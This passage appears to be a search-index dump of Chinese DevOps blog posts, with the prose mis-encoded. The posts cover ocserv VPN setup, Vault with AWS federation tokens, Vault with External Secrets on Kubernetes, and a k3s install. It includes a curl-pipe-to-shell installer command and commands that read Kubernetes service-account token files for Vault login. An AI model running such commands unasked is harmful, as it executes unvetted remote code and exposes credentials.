192.168.0.0/255.255.0.0 26 27# å‘å¸ƒè·¯ç”± 28route = 10.8.2.15/32 29route = 10.10.247.234/32 30route = 10.10.240.37/32 è¯´æ˜ï¼šç«¯å£å¼€åœ¨äº†443ç«¯å£ï¼Œè¯ä¹¦ç”¨çš„æ˜¯acmeçš„å…è´¹è¯ä¹¦ï¼ŒåŸŸåæ˜¯m.rendoumi.comï¼Œipæ®µæ˜¯10.8.12.0/24\nç„¶åé¦–å…ˆç§ç½‘è·¯ç”±å…¨ç¦æ­¢ï¼Œç„¶ååªæ”¾äº†3æ¡/32çš„å•ç‹¬ipè·¯ç”±ï¼Œè¿™æ ·å°±å¥½äº†\næœ€åè½¬å‘è®¾ç½®ä¸€ä¸‹ï¼Œè¿™å°æœåŠ¡å™¨çš„å†…ç½‘åœ°å€æ˜¯ 10.10.240.249\n1# è®¾ç½®è½¬å‘ 2cat /etc/sysctl.conf 3net.ipv4.ip_forward = 1 4 5# è®¾ç½®iptalbes 6iptables -t nat -A POSTROUTING -s 10.8.12.0/24 -j SNAT --to-source 10.10.240.249 7 8# ç”Ÿæˆç”¨æˆ·è®¤è¯æ–‡ä»¶ 9ocpasswd -c /etc/ocserv/passwd zhangrr ç„¶åå»IOSä¸‹è½½Cisco secure clientï¼Œç›´æ¥å»ºç«‹m.rendoumi.comçš„è¿æ¥ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå°±å¯ä»¥è¿æ¥äº†ã€‚\n","date":"2025-08-19","img":"","permalink":"https://rendoumi.com/posts/20250819-oserv_vpn/","series":null,"tags":null,"title":"Ocserv VPNçš„å®‰è£…å’Œä½¿ç”¨"},{"categories":null,"content":"Vaultçš„ä½¿ç”¨ç»§ç»­æ·±å…¥ï¼Œé€šå¸¸æƒ…å†µä¸‹éƒ½æ˜¯å…ˆæ‹¿åˆ°valutçš„root tokenï¼Œç„¶åç™»å½•è®¾ç½®awsçš„è®¤è¯ï¼ŒåŒæ—¶æŠŠawsçš„iam rootå‡­æ®çŒè¿›å»ï¼Œç„¶åwriteè¿›è¡Œè®ºè½¬ï¼Œè¿™æ ·å‡­æ®å°±åªå­˜åœ¨äºvaultä¹‹ä¸­äº†ï¼Œæ²¡æœ‰æ³„éœ²çš„å¯èƒ½ã€‚ç„¶åä»è¿™ä¸ªrootå‡­æ®å†æ´¾ç”Ÿæˆå„ç§ä½¿ç”¨æ—¶é•¿æœ‰é™åˆ¶çš„ä¸´æ—¶å‡­æ®ç”¨ã€‚\nä½†æ˜¯ï¼Œå˜¿å˜¿ï¼Œæˆ‘ååæ²¡æœ‰rootå‡­æ®ï¼Œå› ä¸ºæˆ‘æ˜¯å¤–é¢ç®¡ç†å‘˜ã€‚åªèƒ½ç”¨ federation_token è¿›è¡Œç™»å½•ã€‚\né‚£æ€ä¹ˆä½¿ç”¨å‘¢ï¼Ÿæ–¹æ³•å¦‚ä¸‹ï¼š\né¦–å…ˆåœ¨AWSçš„IAMå»ºç«‹ä¸¤ä¸ªpolicy\n1# Federator çš„policyï¼Œç”¨äºè·å¾—token 2{ 3 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 4 \u0026#34;Statement\u0026#34;: [ 5 { 6 \u0026#34;Sid\u0026#34;: \u0026#34;VisualEditor0\u0026#34;, 7 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 8 \u0026#34;Action\u0026#34;: \u0026#34;sts:GetFederationToken\u0026#34;, 9 \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; 10 } 11 ] 12} 13 14# Change-self-access-keys çš„policyï¼Œç”¨äºè½®è½¬key 15{ 16 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 17 \u0026#34;Statement\u0026#34;: [ 18 { 19 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 20 \u0026#34;Action\u0026#34;: [ 21 \u0026#34;iam:ListUsers\u0026#34;, 22 \u0026#34;iam:GetAccountPasswordPolicy\u0026#34; 23 ], 24 \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; 25 }, 26 { 27 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 28 \u0026#34;Action\u0026#34;: [ 29 \u0026#34;iam:*AccessKey*\u0026#34;, 30 \u0026#34;iam:GetUser\u0026#34; 31 ], 32 \u0026#34;Resource\u0026#34;: [ 33 \u0026#34;arn:aws:iam::*:user/${aws:username}\u0026#34; 34 ] 35 } 36 ] 37} ç„¶ååœ¨Vaultä¸­è®¾ç½®ä½¿ç”¨AWS secrets\n1vault secrets enable aws 2 3# awsä¸­éœ€è¦å¯¹åº”IAMçš„æƒé™ 4# è¦ä¹ˆæ˜¯çœŸæœ‰aws iamçš„ç”¨æˆ·ï¼›è¦ä¹ˆæ˜¯æœ‰ä¸€ä¸ªroleï¼Œå’Œå¯¹åº”çš„ä¸´æ—¶ç”¨æˆ·ï¼›äºŒé€‰ä¸€ 5vault write aws/config/root access_key=YYY \\ 6 secret_key=XXX region=us-east-1 \\ 7 sts_endpoint=https://sts.us-east-1.amazonaws.com sts_region=us-east-1 8 9# è½®è½¬rootå‡­æ®ï¼Œè¿™æ ·rootå‡­æ®å°±åªå­˜åœ¨äºvaultä¸­äº† 10vault write -force aws/config/rotate-root ä½¿ç”¨æ–¹æ³•ï¼š\n1# é¦–å…ˆvaultå…ˆå»ºä¸€ä¸ªè§’è‰²ï¼Œè¿™é‡Œçš„è§’è‰²æ˜¯ec2-adminï¼š 2vault write aws/roles/$role - \u0026lt; aws/roles/$role.json 3å†…å®¹å¦‚ä¸‹ï¼š 4{ 5 \u0026#34;credential_type\u0026#34;: \u0026#34;federation_token\u0026#34;, 6 \u0026#34;default_sts_ttl\u0026#34;: 300, 7 \u0026#34;iam_groups\u0026#34;: null, 8 \u0026#34;max_sts_ttl\u0026#34;: 3600, 9 \u0026#34;policy_arns\u0026#34;: [ 10 \u0026#34;arn:aws:iam::aws:policy/AmazonEC2FullAccess\u0026#34; 11 ], 12 \u0026#34;policy_document\u0026#34;: \u0026#34;\u0026#34; 13} 14 15# æ‹¿åˆ°AK 16vault write aws/sts/ec2-admin ttl=15m 17Key Value 18--- ----- 19lease_id aws/sts/ec2-admin/NNN 20lease_duration 14m59s 21lease_renewable false 22access_key XXX 23secret_key YYY 24security_token ZZZ 25ttl 14m59s æ­£å¸¸ä½¿ç”¨AWSçš„å‡­æ®çš„æ–‡ç« ï¼š\nhttps://devopstronaut.com/hashicorp-vault-101-10-step-by-step-guide-to-configuring-dynamic-aws-credentials-using-iam-user-edb5a75f868a https://notes.kodekloud.com/docs/HashiCorp-Certified-Vault-Associate-Certification/Compare-and-Configure-Secrets-Engines/Demo-AWS-Secrets-Engine-IAM ","date":"2025-08-18","img":"","permalink":"https://rendoumi.com/posts/20250818-vault_sts_token/","series":null,"tags":null,"title":"Vaultä½¿ç”¨AWSçš„federation_tokenè¿›è¡Œäº¤äº’"},{"categories":null,"content":"ä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥ï¼Œå¤§å™©è€—å•Šï¼š external-secrets / external-secrets Link â­ 5416 | ğŸ”€ 1032 | Go 97.6%\nExternal Secrets Operator é¡¹ç›®æš‚åœå‘å¸ƒ ç”±äºç»´æŠ¤å›¢é˜Ÿè§„æ¨¡è¿‡å°ï¼ŒExternal Secrets Operator å†³å®šæš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼Œç›´åˆ°é‡å»ºè¶³å¤Ÿçš„ç»´æŠ¤å›¢é˜Ÿã€‚\nKey Takeaways é¡¹ç›®æš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼ŒåŒ…æ‹¬æ–°åŠŸèƒ½ã€è¡¥ä¸å’Œå®¹å™¨é•œåƒã€‚ å°†ç»§ç»­å®¡æ ¸å’Œåˆå¹¶ç¤¾åŒºçš„ PRï¼Œä½†ä¸ä¼šæä¾› GitHub Discussionsã€Slack æˆ–é—®é¢˜è¯„è®ºçš„æ”¯æŒã€‚ éœ€è¦è‡³å°‘äº”åé•¿æœŸç»´æŠ¤è€…æ¥ç¡®ä¿é¡¹ç›®çš„å¯æŒç»­å‘å±•ã€‚ é¼“åŠ±ä¾èµ–è¯¥é¡¹ç›®çš„å…¬å¸æˆ–å›¢é˜Ÿç§¯æå‚ä¸è´¡çŒ®ã€‚ è´¡çŒ®è€…å¯é€šè¿‡å¡«å†™è¡¨å•æˆ–æŸ¥çœ‹æ²»ç†æ–‡æ¡£åŠ å…¥é¡¹ç›®ã€‚ å±…ç„¶æš‚åœå‘å¸ƒäº†ï¼Œé‚£å°±æŠ“ç´§æ—¶é—´æŠŠVaultè·Ÿå®ƒçš„é›†æˆè®°å½•ä¸‹æ¥ï¼š\nä¸€ã€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…Vaultï¼Œç„¶åå®‰è£…external -secretsï¼Œéƒ½ç”¨helmè£…å³å¯ 1helm repo add hashicorp https://helm.releases.hashicorp.com 2helm repo update 3helm install vault hashicorp/vault --set \u0026#34;server.dev.enabled=true\u0026#34; --set \u0026#34;injector.enabled=true\u0026#34; --namespace default 4 5 6helm repo add external-secrets https://charts.external-secrets.io 7helm repo update 8helm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set installCRDs=true äºŒã€k8sæˆæƒï¼Œk8çš„æˆæƒä½“ç³»å°±æ˜¯ sa -\u0026gt; role -\u0026gt; rolebinding é‚£kubernetesä¼šæŠŠpodä¸­saçš„Tokenæ³¨å…¥åˆ°æ–‡ä»¶ï¼š/var/run/secrets/kubernetes.io/serviceaccount/token\né‚£è°ƒç”¨k8s apiä¸­çš„token revieweræ˜¯å¯ä»¥å¯¹Tokenä»¤ç‰Œè¿›è¡ŒéªŒè¯çš„ï¼Œæˆ‘ä»¬å…ˆå»ºç«‹ä¸€ç³»åˆ—k82èµ„æº\n1--- 2apiVersion: v1 3kind: ServiceAccount 4metadata: 5 name: external-secrets-sa 6 namespace: external-secrets 7 8--- 9apiVersion: rbac.authorization.k8s.io/v1 10kind: ClusterRole 11metadata: 12 name: external-secrets-clusterrole 13rules: 14 - apiGroups: [\u0026#34;\u0026#34;] 15 resources: [\u0026#34;secrets\u0026#34;] 16 verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;, \u0026#34;delete\u0026#34;] 17 - apiGroups: [\u0026#34;authorization.k8s.io\u0026#34;] 18 resources: [\u0026#34;selfsubjectrulesreviews\u0026#34;] 19 verbs: [\u0026#34;create\u0026#34;] 20 21--- 22apiVersion: rbac.authorization.k8s.io/v1 23kind: ClusterRoleBinding 24metadata: 25 name: external-secrets-clusterrolebinding 26subjects: 27 - kind: ServiceAccount 28 name: external-secrets-sa 29 namespace: external-secrets 30roleRef: 31 kind: ClusterRole 32 name: external-secrets-clusterrole 33 apiGroup: rbac.authorization.k8s.io å¦‚ä¸Šï¼Œæˆ‘ä»¬å»ºç«‹äº†ä¸€ä¸ªsaï¼Œç„¶åæœ‰api groupçš„æƒé™ï¼ŒåŒæ—¶æˆäºˆäº†æ•´ä¸ªé›†ç¾¤çº§åˆ«çš„æƒé™\nä¸‰ã€ç™»å½•vaultï¼Œé…ç½®vaultä½¿ç”¨k8sçš„è®¤è¯æ–¹å¼è¿›è¡Œèº«ä»½è®¤è¯ é‚£ enable kubernetes å…¶å®è®¾ç½®äº† vault å¯ä»¥ä½¿ç”¨kubernetesçš„è®¤è¯æ–¹å¼æ¥è¿›è¡Œvault-roleè§’è‰²çš„èº«ä»½è®¤è¯\n1# è¿›å…¥å®¹å™¨ 2kubectl exec -it vault-0 -- /bin/sh 3 4# ç™»å½•ï¼Œè¦è¾“å…¥çš„tokenå¯ä»¥ä»æ—¥å¿—é‡Œçœ‹åˆ° 5vault login root 6 7# å¼€å¯kubernetesè®¤è¯æ–¹å¼ 8vault auth enable kubernetes 9 10# æ¯ä¸ªpodé‡Œé¢éƒ½æœ‰saï¼Œk8sä¼šå°†è¿™ä¸ªsaçš„tokenæ³¨å…¥åˆ°æ–‡ä»¶/var/run/secrets/kubernetes.io/serviceaccount/token 11# é‚£å°±ç”¨è¿™ä¸ªsaçš„tokenï¼Œè°ƒç”¨k8s token_reviewerè¿›è¡Œèº«ä»½è®¤è¯ 12# è®¤è¯é€šè¿‡vaultå°±ä¼šé¢å‘ä¸€ä¸ªå¯¹åº”vault-roleçš„vault-tokenä»¤ç‰Œå‡ºæ¥ 13# ç”¨vault-tokenå°±å¯ä»¥å»vaulté‡Œè¯»å–åˆ°vault-secretçš„å†…å®¹äº† 14vault write auth/kubernetes/config \\ 15 token_reviewer_jwt=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ 16 kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ 17 kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt 18 19# æ‹¿tokençš„å¦ä¸€ç§æ–¹æ³•ï¼š 20# kubectl get secret $(kubectl get serviceaccount external-secrets-sa -o jsonpath=\u0026#34;{.secrets[0].name}\u0026#34;) -o jsonpath=\u0026#34;{.data.token}\u0026#34; | base64 --decode 21 22 23# vaultçš„è®¤è¯ä½“ç³»è·ŸAWSä¸€æ · 24# å…ˆå»ºpolicyï¼Œåå»ºrole 25# æ‰€ä»¥å…ˆå»ºä¸€ä¸ªè¯»secretçš„ç­–ç•¥ 26vault policy write external-secrets-policy - \u0026lt;\u0026lt;EOF 27path \u0026#34;secret/data/*\u0026#34; { 28Â capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] 29} 30EOF 31 32# ç„¶åå»ºç«‹ä¸€ä¸ªvaultçš„roleï¼Œå°†è¿™ä¸ªvault-roleç»‘å®šåˆ°k8sçš„saè´¦å·ä¸Š 33# é‚£k8s token reviewè®¤è¯é€šè¿‡å°±å¯ä»¥è·å¾—ç›¸åº”vault-roleçš„æƒé™ 34vault write auth/kubernetes/role/external-secrets-operator \\ 35 bound_service_account_names=external-secrets-sa \\ 36 bound_service_account_namespaces=external-secrets \\ 37 policies=external-secrets-policy \\ 38 ttl=24h 39 40# æ”¾æ•°æ®è¿›å»vault 41vault kv put secret/my-app MY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; 42vault kv get secret/my-app å››ã€external-secretåŒæ­¥çš„è®¾å®š external-secretç›¸å½“äºä¸­é—´äººï¼Œä»–æœ‰å¾ˆå¤šè‡ªå®šä¹‰çš„èµ„æºï¼Œæ¥è‡ªåŠ¨è¿›è¡Œvault-secretå’Œk8s-secretä¹‹é—´çš„åŒæ­¥\nClusterSecretStoreæŒ‡å®šäº†vault serverã€vault-roleã€k8s saçš„å…³ç³»\n1--- 2apiVersion: external-secrets.io/v1 3kind: ClusterSecretStore 4metadata: 5 name: vault-cluster-secretstore 6spec: 7 provider: 8 vault: 9 server: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # è¯·æ ¹æ®ä½ çš„vaultæœåŠ¡åœ°å€è°ƒæ•´ 10 path: \u0026#34;secret\u0026#34; # KVå¼•æ“æŒ‚è½½è·¯å¾„ï¼Œä¸ä½ vault kv putå‘½ä»¤ä¸­è·¯å¾„å¯¹åº” 11 version: \u0026#34;v2\u0026#34; # KVç‰ˆæœ¬ä¸ºv2 12 auth: 13 kubernetes: 14 mountPath: \u0026#34;kubernetes\u0026#34; # ä½ å¯ç”¨çš„k8s authè·¯å¾„ 15 role: \u0026#34;external-secrets-operator\u0026#34; # ä½ åœ¨vaultä¸­åˆ›å»ºçš„roleåç§° 16 serviceAccountRef: 17 name: external-secrets-sa # ä½ ä¸ºESOåˆ›å»ºçš„ServiceAccountåç§° 18 namespace: external-secrets # ServiceAccountæ‰€åœ¨å‘½åç©ºé—´ ExternalSecret æŒ‡å®šäº†åˆ©ç”¨vault-roleè·å¾—äº†vault-secretï¼Œæ”¾ç½®åˆ°æœ€ç»ˆè¦ç”¨åˆ°çš„k8s-secretä¸­\næ³¨æ„æœ‰åˆ·æ–°ï¼Œæ¯å°æ—¶ä¼šåˆ·æ–°ä¸€æ¬¡çš„\n1--- 2apiVersion: external-secrets.io/v1 3kind: ExternalSecret 4metadata: 5 name: demo-external-secret 6 namespace: default 7spec: 8 refreshInterval: 1h 9 secretStoreRef: 10 name: vault-cluster-secretstore 11 kind: ClusterSecretStore 12 target: 13 name: demo-secret 14 creationPolicy: Owner 15 data: 16 - secretKey: MY_SECRET_NAME 17 remoteRef: 18 key: my-app 19 property: MY_SECRET_NAME # Vaultä¸­å…·ä½“çš„é”®å é€šè¿‡ä»¥ä¸Šä¸¤ä¸ªèµ„æºï¼Œé‚£vaulté‡Œå­˜æ”¾çš„secretå°±è¢«åŒæ­¥åˆ°k8sçš„secretä¸­äº†\näº”ã€å®é™…éƒ¨ç½²ä¸€ä¸ªåº”ç”¨çœ‹çœ‹ é‚£æˆ‘ä»¬éšä¾¿èµ·ä¸ªdeployment\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: demo-deployment 6 namespace: default # ä½¿ç”¨ç›®æ ‡å‘½åç©ºé—´ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä½ çš„å®é™…å‘½åç©ºé—´ 7 labels: 8 app: demo 9spec: 10 replicas: 1 # å‰¯æœ¬æ•°é‡ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ 11 selector: 12 matchLabels: 13 app: my-app 14 template: 15 metadata: 16 labels: 17 app: my-app 18 spec: 19 containers: 20 - name: demo-container 21 image: nginx:latest 22 imagePullPolicy: IfNotPresent # å¦‚æœæœ¬åœ°å·²ç»å­˜åœ¨é•œåƒåˆ™ä¸æ‹‰å– 23 ports: 24 - containerPort: 8080 # å®¹å™¨æš´éœ²çš„ç«¯å£ 25 env: 26 - name: MY_SECRET_NAME 27 valueFrom: 28 secretKeyRef: 29 name: demo-secret # å¼•ç”¨çš„ Secret åç§° 30 key: MY_SECRET_NAME # Secret ä¸­çš„é”®å 31 32--- 33apiVersion: v1 34kind: Secret 35metadata: 36 name: demo-secret 37 namespace: default # ä½¿ç”¨ç›®æ ‡å‘½åç©ºé—´ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºä½ çš„å®é™…å‘½åç©ºé—´ 38type: Opaque 39data: 40 MY_SECRET_NAME: AABBCC å®åœ¨å¤ªå¤æ‚ç—›è‹¦äº†ï¼Œæœ€ç»ˆçš„ç¯å¢ƒå˜é‡åº”è¯¥å¦‚ä¸‹ï¼š\n1MY_SECRET_NAME=\u0026#34;Fuck Dingdang\u0026#34; ä½†è¿™æ²¡æœ‰ç»“æŸå‘¢ã€‚\nå…­ã€å®‰è£…é…ç½®reloaderè‡ªåŠ¨è½®æ¢ å¦‚æœsecretè¢«æ”¹äº†ï¼Œå¦‚AKçš„Secretè‡ªåŠ¨è½®æ¢äº†ï¼Œé‚£podä¹Ÿå¿…é¡»è·Ÿç€è‡ªåŠ¨é‡å¯ä»¥åŠ è½½æ–°çš„å˜é‡\n1# å®‰è£…reloader 2kubectl apply -f https://raw.githubusercontent.com/stakater/Reloader/master/deployments/kubernetes/reloader.yaml åœ¨deployä¸­containerçš„éƒ¨åˆ†æ–°å¢annotations:\n1metadata: 2 annotations: 3 reloader.stakater.com/auto: \u0026#34;true\u0026#34; å¦‚ä¸‹ï¼š\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: demo-deployment 6 namespace: default 7 annotations: 8 reloader.stakater.com/auto: \u0026#34;true\u0026#34; 9 labels: 10 app: demo 11spec: 12 replicas: 1 # å‰¯æœ¬æ•°é‡ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´ 13 selector: 14 matchLabels: 15 app: my-app 16 template: 17 metadata: 18 labels: 19 app: my-app 20 spec: 21 containers: 22 - name: demo-container 23 image: nginx:latest 24 imagePullPolicy: IfNotPresent # å¦‚æœæœ¬åœ°å·²ç»å­˜åœ¨é•œåƒåˆ™ä¸æ‹‰å– 25 ports: 26 - containerPort: 80 27 env: 28 - name: MY_SECRET_NAME 29 valueFrom: 30 secretKeyRef: 31 name: demo-secret # å¼•ç”¨çš„ Secret åç§° 32 key: MY_SECRET_NAME # Secret ä¸­çš„é”®å è¿™æ ·ENVç¯å¢ƒå˜é‡æ”¹å˜çš„æ—¶å€™å°±å¯ä»¥è‡ªåŠ¨é‡èµ·pod\nä¸ƒã€å¦ä¸€ç§æ³¨å…¥å¼çš„åšæ³•vault injector Deploymentæ–°å¢annotations:\n1metadata: 2 annotations: 3 vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; 4 vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; 5 vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; 6 vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | 7 {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} 8 export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; 9 {{- end -}} å®Œæ•´å¦‚ä¸‹ï¼š\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: demo-deployment 6 namespace: default 7 annotations: 8 vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; 9 vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; 10 vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; 11 vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | 12 {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} 13 export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; 14 {{- end }} 15spec: 16 replicas: 1 17 selector: 18 matchLabels: 19 app: my-app 20 template: 21 metadata: 22 labels: 23 app: my-app 24 annotations: 25 vault.hashicorp.com/agent-inject: \u0026#34;true\u0026#34; 26 vault.hashicorp.com/role: \u0026#34;demo-role\u0026#34; 27 vault.hashicorp.com/agent-inject-secret-MY_SECRET_NAME: \u0026#34;secret/data/demo\u0026#34; 28 vault.hashicorp.com/agent-inject-template-MY_SECRET_NAME: | 29 {{- with secret \u0026#34;secret/data/demo\u0026#34; -}} 30 export MY_SECRET_NAME=\u0026#34;{{ .Data.data.MY_SECRET_NAME }}\u0026#34; 31 {{- end }} 32 spec: 33 serviceAccountName: demo-sa 34 containers: 35 - name: demo-container 36 image: nginx:latest 37 imagePullPolicy: IfNotPresent 38 ports: 39 - containerPort: 80 å¦‚ä¸Šä¹Ÿå¯ä»¥åšåˆ°secretæœ‰æ”¹åŠ¨ï¼Œå°±è‡ªåŠ¨é‡å¯\nå…«ã€è¡¥å…¨ä¸€ä¸‹ç”¨k8s Tokenå‡­æ®éªŒè¯vaultè§’è‰²çš„è¿‡ç¨‹ 1# å…ˆå»ºç«‹ä¸€ä¸ªSA 2apiVersion: v1 3kind: ServiceAccount 4metadata: 5 name: demo-sa 6 namespace: default 7 8# ç„¶åå®šä¹‰ä¸€ä¸ªDeploymentï¼Œåœ¨specé™„ä¸Šè¿™ä¸ªSA 9--- 10apiVersion: apps/v1 11kind: Deployment 12metadata: 13 labels: 14 app: nginx 15 name: nginx 16 namespace: default 17spec: 18 serviceAccountName: demo-sa 19 replicas: 1 20 selector: 21 matchLabels: 22 app: nginx 23 template: 24 metadata: 25 labels: 26 app: nginx 27 spec: 28 containers: 29 - env: 30 - name: VAULT_ADDR 31 value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # æ›¿æ¢ä¸º Vault çš„æœåŠ¡åœ°å€ 32 image: nginx:latest 33 imagePullPolicy: IfNotPresent 34 name: nginx 35 36# ç™»å½•vaultæœåŠ¡ï¼ˆå¼€å‘æ¨¡å¼ï¼Œç™»å½•ç”¨æˆ·æ˜¯rootï¼‰ 37vault login root 38 39# å¯ç”¨ Kubernetes Auth æ¨¡å¼ 40vault auth enable kubernetes 41 42# vault ä½¿ç”¨ sa Tokenè¿›è¡Œèº«ä»½è¯†åˆ« 43vault write auth/kubernetes/config \\ 44 token_reviewer_jwt=\u0026#34;$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\u0026#34; \\ 45 kubernetes_host=\u0026#34;https://kubernetes.default.svc:443\u0026#34; \\ 46 kubernetes_ca_cert=@/var/run/secrets/kubernetes.io/serviceaccount/ca.crt 47 48# åˆ›å»ºä¸€ä¸ªpolicy 49vault policy write demo-policy - \u0026lt;\u0026lt;EOF 50path \u0026#34;secret/data/*\u0026#34; { 51 capabilities = [\u0026#34;read\u0026#34;, \u0026#34;list\u0026#34;] 52} 53EOF 54 55# åˆ›å»ºä¸€ä¸ªvault-roleï¼Œç»‘å®šåˆ°sa 56vault write auth/kubernetes/role/demo-role \\ 57 bound_service_account_names=demo-sa \\ 58 bound_service_account_namespaces=default \\ 59 policies=demo-policy \\ 60 61# å­˜æ”¾æµ‹è¯•kvæ•°æ® 62vault kv put secret/demo MY_SECRET_NAME=\u0026#34;BBCCDDEE\u0026#34; 63vault kv get secret/demo 64 65# å¯åŠ¨ä¸€ä¸ªdeployment 66--- 67apiVersion: apps/v1 68kind: Deployment 69metadata: 70 labels: 71 app: nginx 72 name: nginx 73 namespace: default 74spec: 75 serviceAccountName: demo-sa 76 replicas: 1 77 selector: 78 matchLabels: 79 app: nginx 80 template: 81 metadata: 82 labels: 83 app: nginx 84 spec: 85 containers: 86 - env: 87 - name: VAULT_ADDR 88 value: \u0026#34;http://vault.default.svc.cluster.local:8200\u0026#34; # æ›¿æ¢ä¸º Vault çš„æœåŠ¡åœ°å€ 89 image: nginx:latest 90 imagePullPolicy: IfNotPresent 91 name: nginx 92 93# è¿›å…¥deploymentçš„podä¸­ 94kubectl exec -it nginx -- /bin/sh 95 96# æ‹¿åˆ°æœ¬åœ°saçš„Token 97export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) 98 99# æ³¨æ„podé‡Œæœ‰ç¯å¢ƒå˜é‡VAULT_ADDRï¼Œå¦‚æœæ²¡æœ‰è¦å®šä¹‰ä¸€ä¸‹ 100# ç„¶åç”¨curlæ‹¿vault-token 101curl -X POST \u0026#34;${VAULT_ADDR}/v1/auth/kubernetes/login\u0026#34; \\ 102 -H \u0026#34;Content-Type: application/json\u0026#34; \\ 103 -d \u0026#39;{ 104 \u0026#34;role\u0026#34;: \u0026#34;demo-role\u0026#34;, 105 \u0026#34;jwt\u0026#34;: \u0026#34;\u0026#39;$TOKEN\u0026#39;\u0026#34; 106 }\u0026#39; 107 108# curl è¿”å›å­—ç¬¦ä¸²ä¸­çš„ client_token å­—æ®µ 109export VAULT_TOKEN=\u0026#34;hvs.CAESaaaBBBcccDDDEEEfffGGG\u0026#34; 110 111# ç”¨vault_tokenè·å¾—kvçš„æ•°æ® 112curl -X GET \u0026#34;${VAULT_ADDR}/v1/secret/data/demo\u0026#34; -H \u0026#34;X-Vault-Token: $VAULT_TOKEN\u0026#34; æ‰€ä»¥ï¼Œå…¶å®vaultæœ‰apiæ¥å£ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨curlæ¥è®¤è¯å¹¶è·å–æ•°æ®ï¼Œè¿™å°±æå¤§çš„æ‰©å±•äº†vaultçš„æ¥å£èŒƒå›´ã€‚\nå¥½äº†ï¼Œå°±åˆ°è¿™é‡Œå§ï¼\n","date":"2025-08-15","img":"","permalink":"https://rendoumi.com/posts/20250815-vault_k8s/","series":null,"tags":null,"title":"Vaultä½¿ç”¨external Secretç®¡ç†kubernetes Secret"},{"categories":null,"content":"è¿™ç¯‡æ˜¯ä¸€ä¸ªå¤§æ°´è´´ï¼Œåªæ˜¯ä¸ºäº†è®°å½•k3sçš„å®‰è£…\nè¿™ä¸ªä¸œè¥¿è¢«Rancherç”¨å¾—çº¯ç†Ÿï¼Œå…ˆæ­å»ºä¸€ä¸ªk3sé›†ç¾¤ï¼Œç„¶åå†å…¶ä¸Šè£…æ§åˆ¶è½¯ä»¶ï¼Œå†å»æ§åˆ¶å…¶å®ƒé›†ç¾¤ï¼Œéå¸¸å¥½çš„æƒ³æ³•ï¼Œå€¼å¾—å€Ÿé‰´\nå®‰è£…å’Œåˆ é™¤éƒ½éå¸¸ç®€æ´ï¼Œå‡†å¤‡å·¥ä½œï¼š\n1apt update \u0026amp;\u0026amp; apt upgrade -y 2 3# ä¸‰å°æœºå™¨åˆ†åˆ«è®¾ç½® 4hostnamectl set-hostname master 5hostnamectl set-hostname worker-1 6hostnamectl set-hostname worker-2 7 8# vi /etc/hosts 9127.0.0.1 master 10 11# ä¸¤å¤–ä¸¤å°ä¹Ÿåˆ†åˆ«è®¾ç½® 12127.0.0.1 worker-1 13 14# ç¬¬3å° 15127.0.0.1 worker-2 å‡†å¤‡å·¥ä½œéƒ½å¼„å¥½äº†ã€‚ä¸‹é¢å®‰è£…\n1curl -sfL https://get.k3s.io | sh - 2 3systemctl status k3s 4 5cat /var/lib/rancher/k3s/server/node-token 6 7# åŠ å…¥æ–°èŠ‚ç‚¹ 8curl -sfL https://get.k3s.io | K3S_URL=https://192.168.0.200:6443 K3S_TOKEN=\u0026lt;your-token-here\u0026gt; INSTALL_K3S_EXEC=\u0026#34;--node-ip=\u0026lt;worker-ip\u0026gt;\u0026#34; sh - åˆ é™¤ä¹Ÿå°±ä¸€å¥\n1/usr/local/bin/k3s-uninstall.sh 